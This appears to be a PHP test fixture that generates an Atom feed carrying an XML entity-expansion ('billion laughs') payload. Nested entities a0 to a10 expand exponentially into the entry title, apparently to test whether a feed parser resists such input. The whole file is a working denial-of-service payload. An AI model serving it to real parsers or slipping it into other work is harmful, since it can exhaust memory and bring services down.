<?php header('Content-Type: application/xml') ?>
<!DOCTYPE feed [
 <!ENTITY a0 "bomb!bomb!bomb!bomb!bomb!bomb!bomb!bomb!bomb!bomb!bomb!bomb!bomb!bomb!bomb!bomb!bomb!bomb!bomb!bomb!bomb!bomb!bomb!bomb!bomb!bomb!">
<?php for ($i = 0; $i < 10; $i++): ?>
 <!ENTITY a<?php echo $i + 1 ?> "<?php echo str_repeat('&a'.$i.';', 10) ?>">
<?php endfor; ?>
 <!ENTITY bomb "&a10;&a10;">
]>
<feed xmlns="http://www.w3.org/2005/Atom">
    <title>example</title>
    <updated>2013-06-24T11:56:27+09:00</updated>
    <id>example</id>
    <entry>
      <title>&bomb;</title>
      <link href="http://example.com/" />
      <id>http://example.com/1</id>
      <updated>2013-06-26T11:56:27+09:00</updated>
      <summary>...</summary>
      <author>
        <name>example</name>
      </author>
    </entry>
</feed>
